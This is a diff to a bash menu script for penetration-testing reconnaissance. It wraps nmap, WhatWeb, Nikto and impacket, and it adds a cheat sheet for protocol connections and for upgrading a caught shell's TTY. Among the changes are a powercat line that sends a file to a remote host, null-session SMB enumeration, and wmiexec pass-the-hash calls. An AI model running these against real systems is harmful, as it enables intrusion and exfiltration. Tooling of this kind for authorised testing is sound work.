@@ -118,43 +118,6 @@ show_help() {
     echo "Description:"
     echo "  This script automates various tasks for penetration testing and reconnaissance."
     echo
-    echo "  Options:"
-    echo -e "  1) Configure IP:"
-    echo "     Set the target host IP and detect its operating system."
-    echo
-    echo -e "  2) Create directories:"
-    echo "     Create the main working directory and its subdirectories."
-    echo
-    echo -e "  3) NMAP scans:"
-    echo "     Perform different types of NMAP scans to enumerate open ports and services."
-    echo
-    echo -e "  4) Web Tools:"
-    echo "     Use tools like WhatWeb, Nikto, and Gobuster for web service enumeration."
-    echo
-    echo -e "  5) OSINT Tools:"
-    echo "     Use tools like theHarvester, Spiderfoot, and FinalRecon for open source intelligence gathering."
-    echo
-    echo -e "  6) Exploit Tools:"
-    echo "     Generate payloads and search for exploits using Searchsploit."
-    echo
-    echo -e "  7) CheatSheets:"
-    echo "     Display various cheat sheets for Linux commands, Windows commands, pivoting, and file transfer techniques."
-    echo
-    echo -e "  8) Hash Crack:"
-    echo "     Detect hash types and crack hashes using Hashcat."
-    echo
-    echo -e "  9) Reverse Shell Generator:"
-    echo "     Generate reverse shell commands for various programming languages and tools."
-    echo
-    echo -e "  10) Generate Report:"
-    echo "     Save the results of the enumeration and scanning to a report file."
-    echo
-    echo -e "  11) Check and Install Dependencies:"
-    echo "     Check for and install necessary dependencies for the script."
-    echo
-    echo -e "  12) Save & Exit:"
-    echo "     Save the current configuration and exit the script."
-    echo
     echo "  This script also supports loading a configuration file with the '-c' option to restore a previous session."
     echo
     echo "Example:"
@@ -219,7 +182,7 @@ create_directories() {
 
         if [ -d "$DIR_PATH" ]; then
             echo -e "${BLUE}[+] Found ${DIR_PATH} - Copying to ${BASE_DIR}${NC}"
-            cp -r "$DIR_PATH" "$BASE_DIR"
+            cp -rf "$DIR_PATH/"* "$BASE_DIR"
         else
             echo -e "${RED}[-] The obsidian_notes directory was not found.${NC}"
         fi
@@ -279,10 +242,15 @@ scan_nmap() {
                 update_ports
                 last_output=$(cat "$ENUM_DIR/nmap_open_ports.txt")
                 save_results
+                echo
+                echo -e "${BLUE}[+] Saved scan results at $ENUM_DIR/nmap_open_ports.txt${NC}"
                 ;;
             3)
+                show_info_panel
+                echo
                 echo -e "${BLUE}[+] Select the range of ports (1-1000), specific ports separated by commas (80,443,445) or 'all' to scan all ports:${NC}"
                 read -e -p "Ports: " port_range
+                clear
                 if [ "$port_range" == "all" ]; then
                     specific_ports="-p-"
                 else
@@ -293,18 +261,22 @@ scan_nmap() {
                 update_ports
                 last_output=$(cat "$ENUM_DIR/nmap_info_ports.txt")
                 save_results
+                echo
+                echo -e "${BLUE}[+] Saved scan results at $ENUM_DIR/nmap_info_ports.txt${NC}"
                 ;;
             4)
+                show_info_panel
+                echo
                 echo -e "${BLUE}[+] Custom Scan Settings:${NC}"
-                read -e -p "Enter the ports to scan (example: 1-100 o 80,443 o todos): " ports
+                read -e -p "Enter the ports to scan (example: 1-100 o 80,443 or all): " ports
                 read -e -p "You want to detect the version of the service -sV (y/n): " service_version
                 read -e -p "You want to perform a script scan -sC (y/n): " script_scan
                 read -e -p "You want to perform an aggressive scan -A (y/n): " aggressive_scan
                 read -e -p "You want to perform a UDP scan -sU (y/n): " udp_scan
                 read -e -p "Enter the intensity level -T (0-5, default is 3): " intensity
                 read -e -p "You want to scan without ping -Pn (y/n): " no_ping
-                read -e -p "You want to scan behind firewall -f (y/n): " firewall_scan
-                read -e -p "You want to perform a quick scan -F (y/n): " fast_scan
+
+                clear
 
                 custom_options=""
                 if [ "$ports" == "all" ]; then
@@ -333,15 +305,14 @@ scan_nmap() {
                 if [ "$firewall_scan" == "y" ]; then
                     custom_options="$custom_options -f"
                 fi
-                if [ "$fast_scan" == "y" ]; then
-                    custom_options="$custom_options -F"
-                fi
 
                 echo -e "${BLUE}[+] Performing custom port scanning with nmap.${NC}"
                 nmap $custom_options $IP --open -oN "$ENUM_DIR/nmap_custom_scan.txt"
                 update_ports
                 last_output=$(cat "$ENUM_DIR/nmap_custom_scan.txt")
                 save_results
+                echo
+                echo -e "${BLUE}[+] Saved scan results at $ENUM_DIR/nmap_custom_scan.txt${NC}"
                 ;;
             5)
                 clear
@@ -382,7 +353,7 @@ save_results() {
         echo "OPEN_PORTS=${OPEN_PORTS}"
         echo "BASE_DIR=${BASE_DIR}"
     } > "$conf_file"
-    echo -e "${BLUE}[+] Results saved in ${conf_file}${NC}"
+    echo -e "${BLUE}[+] Config file updated in ${conf_file}${NC}"
     echo -e "${YELLOW}[!!] Thanks for use ${VIOLET}EnumeRannden${YELLOW} [!!]${NC}"
 }
 
@@ -396,7 +367,7 @@ save_report() {
     report_file="${BASE_DIR}/report_${BASE_DIR##*/}.txt"
     pdf_report_file="${BASE_DIR}/report_${BASE_DIR##*/}.pdf"
     html_report="/tmp/report.html"
-    cover_image="path/to/your/cover_image.jpg"  # Update this path to your cover image
+    cover_image="path/to/your/cover_image.jpg"
 
     # Save TXT Report
     {
@@ -857,7 +828,8 @@ show_cheatsheets() {
         echo -e "2) Windows commands"
         echo -e "3) Pivoting"
         echo -e "4) File transfers"
-        echo -e "5) Back to Main Menu"
+        echo -e "5) Protocol Connections"
+        echo -e "6) Back to Main Menu"
         read -e -p "Option: " cheatsheet_option
 
         case $cheatsheet_option in
@@ -1099,7 +1071,7 @@ show_cheatsheets() {
     			echo
     			echo -e "${YELLOW}FTP:${NC}"
     			echo "example: ftp -s:script.txt"
-    			echo "Nota: 'script.txt' contiene comandos FTP como 'open', 'user', 'get', etc."
+    			echo "Note: 'script.txt' contains FTP commands like 'open', 'user', 'get', etc."
     			echo
     			echo -e "${YELLOW}Powercat:${NC}"
    				echo "example: powercat -c remote_host -p 443 -i C:\\path\\to\\file"
@@ -1111,6 +1083,55 @@ show_cheatsheets() {
                 break
     			;;
             5)
+                clear
+                echo -e "${VIOLET}\n\n\n===================================================="
+                echo -e "================== ${YELLOW}Protocols Connections ${VIOLET}=================="
+                echo -e "====================================================${NC}"
+                echo
+    			echo -e "${YELLOW}TTY Treatment:${NC}"
+    			echo -e "${GREEN}script /dev/null -c bash"
+                echo -e "Ctrl + Z"
+                echo -e "stty raw -echo; fg"
+                echo -e "reset"
+                echo -e "xterm"
+                echo -e "export TERM=xterm"
+                echo -e "export SHELL=bash${NC}"
+                echo
+                echo "In other terminal we can see our terminal size"
+                echo -e "${GREEN}ssty size"
+                echo
+                echo "stty rows X columns Y${NC}"
+    			echo
+                echo -e "${YELLOW}SSH Connection:${NC}"
+    			echo "example: ssh <username>@<IP>"
+                echo
+                echo -e "${YELLOW}MySQL Connection:${NC}"
+    			echo "example: mysql -u <username> -h <IP>"
+                echo
+                echo -e "${YELLOW}MySQL Connection:${NC}"
+    			echo "example: mysql -u <username> -h <IP>"
+                echo
+                echo -e "${YELLOW}FTP Connection:${NC}"
+    			echo "example: ftp <IP>"
+                echo "we can try with the username anonymous without password"
+                echo
+                echo -e "${YELLOW}SMB Connection:${NC}"
+    			echo "Entry to a Share: smbclient //<IP>/<Share_Name> -U <username>"
+                echo
+    			echo "Enumerate Shares: smbclient -N -L <IP>"
+                echo "Enumerate Shares: rpcclient -U "username" 192.168.X.X"
+                echo "Enumerate Shares (Null Session): rpcclient -U "" <IP> -N"
+                echo
+                echo -e "${YELLOW}Telnet Connection:${NC}"
+    			echo "example: telnet <IP>"
+                echo
+                echo -e "${YELLOW}RDP Connection:${NC}"
+    			echo "example: xfreerdp /u:<username> /p:<password> /v:<IP>:<PORT>    -- Default port is 3389"
+                echo
+                read -e -p "Press enter to go back..."
+                break
+                ;;
+            6)
                 clear
                 break
                 ;;
@@ -1503,42 +1524,68 @@ web_tools_menu() {
             1)
                 show_info_panel
                 if [ -z "$IP" ]; then
-                    echo -e "${RED}[-] No IP configured.${NC}"
-                else
-                    read -e -p "Enter the port to scan with WhatWeb: " whatweb_port
-                    read -e -p "Is it an HTTPS port? (y/n): " is_https
-                    clear
-                    if [ "$is_https" == "y" ]; then
-                        echo -e "${GREEN}[+] Performing whatweb scan on https://${IP}:${whatweb_port}${NC}"
-                        whatweb https://${IP}:${whatweb_port} > "$ENUM_DIR/whatweb_$whatweb_port.txt"
+                    read -e -p "No IP configured. Please enter an IP: " input_ip
+                    if [ -z "$input_ip" ]; then
+                        echo -e "${RED}[-] No IP provided. Exiting...${NC}"
+                        exit 1
                     else
-                        echo -e "${GREEN}[+] Performing whatweb scan on http://${IP}:${whatweb_port}${NC}"
-                        whatweb http://${IP}:${whatweb_port} > "$ENUM_DIR/whatweb_$whatweb_port.txt"
+                        ip_to_use="$input_ip"
                     fi
-                    last_output=$(cat "$ENUM_DIR/whatweb_$whatweb_port.txt")
-                    echo -e "${GREEN}[+] WhatWeb Report saved in ${ENUM_DIR}/whatweb_${whatweb_port}.txt${NC}"
-                    cat "$ENUM_DIR/whatweb_$whatweb_port.txt"
+                else
+                    read -e -p "Press Enter to use configured IP ($IP) or enter a new IP: " input_ip
+                    if [ -z "$input_ip" ]; then
+                        ip_to_use="$IP"
+                    else
+                        ip_to_use="$input_ip"
+                    fi
                 fi
+
+                read -e -p "Enter the port to scan with WhatWeb: " whatweb_port
+                read -e -p "Is it an HTTPS port? (y/n): " is_https
+                clear
+                if [ "$is_https" == "y" ]; then
+                    echo -e "${GREEN}[+] Performing WhatWeb scan on https://${ip_to_use}:${whatweb_port}${NC}"
+                    whatweb https://${ip_to_use}:${whatweb_port} > "$ENUM_DIR/whatweb_$whatweb_port.txt"
+                else
+                    echo -e "${GREEN}[+] Performing WhatWeb scan on http://${ip_to_use}:${whatweb_port}${NC}"
+                    whatweb http://${ip_to_use}:${whatweb_port} > "$ENUM_DIR/whatweb_$whatweb_port.txt"
+                fi
+                last_output=$(cat "$ENUM_DIR/whatweb_$whatweb_port.txt")
+                echo -e "${GREEN}[+] WhatWeb Report saved in ${ENUM_DIR}/whatweb_${whatweb_port}.txt${NC}"
+                cat "$ENUM_DIR/whatweb_$whatweb_port.txt"
                 ;;
             2)
                 show_info_panel
                 if [ -z "$IP" ]; then
-                    echo -e "${RED}[-] No IP configured.${NC}"
+                    read -e -p "No IP configured. Please enter an IP: " input_ip
+                    if [ -z "$input_ip" ]; then
+                        echo -e "${RED}[-] No IP provided. Exiting...${NC}"
+                        exit 1
+                    else
+                        ip_to_use="$input_ip"
+                    fi
                 else
-                    read -e -p "Enter the port to scan with Nikto: " nikto_port
-                    clear
-                    echo -e "${GREEN}[+] Performing Nikto scan on ${IP}:${nikto_port}${NC}"
-                    nikto -h $IP:$nikto_port | tee "$ENUM_DIR/nikto_$nikto_port.txt"
-                    last_output=$(cat "$ENUM_DIR/nikto_$nikto_port.txt")
-                    echo -e "${GREEN}[+] Nikto Report saved in ${ENUM_DIR}/nikto_${nikto_port}.txt${NC}"
+                    read -e -p "Press Enter to use configured IP ($IP) or enter a new IP: " input_ip
+                    if [ -z "$input_ip" ]; then
+                        ip_to_use="$IP"
+                    else
+                        ip_to_use="$input_ip"
+                    fi
                 fi
+
+                read -e -p "Enter the port to scan with Nikto: " nikto_port
+                clear
+                echo -e "${GREEN}[+] Performing Nikto scan on ${ip_to_use}:${nikto_port}${NC}"
+                nikto -h $ip_to_use:$nikto_port | tee "$ENUM_DIR/nikto_$nikto_port.txt"
+                last_output=$(cat "$ENUM_DIR/nikto_$nikto_port.txt")
+                echo -e "${GREEN}[+] Nikto Report saved in ${ENUM_DIR}/nikto_${nikto_port}.txt${NC}"
                 ;;
             3)
                 show_info_panel
                 if [ -z "$IP" ]; then
                     echo -e "${RED}[-] No IP configured.${NC}"
                 else
-                    read -e -p "Enter the URL/IP to scan with Gobuster: " gobuster_target
+                    read -e -p "Enter the URL/IP to scan with Gobuster (http://example.org | 10.10.10.10): " gobuster_target
                     echo -e "${BLUE}[+] ¿Do you want to fuzz with file extensions? (y/n):${NC}"
                     read -e -p "Option: " fuzz_option
                     if [ "$fuzz_option" == "y" ]; then
@@ -1581,7 +1628,7 @@ web_tools_menu() {
 }
 
 subdomain_enumeration() {
-    read -e -p "Enter the domain to enumerate subdomains: " domain
+    read -e -p "Enter the domain to enumerate subdomains: (10.10.10.10 or example.org)" domain
     echo -e "${YELLOW}[+] Enumerating subdomains for $domain...${NC}"
     sublist3r -d $domain
 }
@@ -2042,14 +2089,14 @@ run_impacket() {
             read -e -p "Enter password: " password
             python3 /usr/share/doc/python3-impacket/examples/smbclient.py $domain/$username:$password@$target_ip
             ;;
-	5)
+	    5)
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
             read -e -p "Enter hash: " hash
             python3 /usr/share/doc/python3-impacket/examples/wmiexec.py $domain/$username@$target_ip -hashes lmhash:nthash
             ;;
-	6)
+	    6)
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
@@ -2091,7 +2138,7 @@ run_impacket() {
             read -e -p "Enter password: " password
             python3 /usr/share/doc/python3-impacket/examples/atexec.py $domain/$username:$password@$target_ip
             ;;
-	12)
+	    12)
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
@@ -2468,7 +2515,7 @@ send_command() {
 }
 
 check_install_dependencies() {
-    dependencies=("nmap" "whatweb" "nikto" "gobuster" "hashcat" "python3-pip" "finalrecon" "theharvester" "recon-ng" "nuclei" "tmux" "wkhtmltopdf")
+    dependencies=("nmap" "whatweb" "nikto" "gobuster" "hashcat" "python3-pip" "finalrecon" "theharvester" "recon-ng" "sublist3r" "nuclei" "tmux" "wkhtmltopdf")
 
     echo -e "${BLUE}[+] Checking and installing dependencies...${NC}"
 
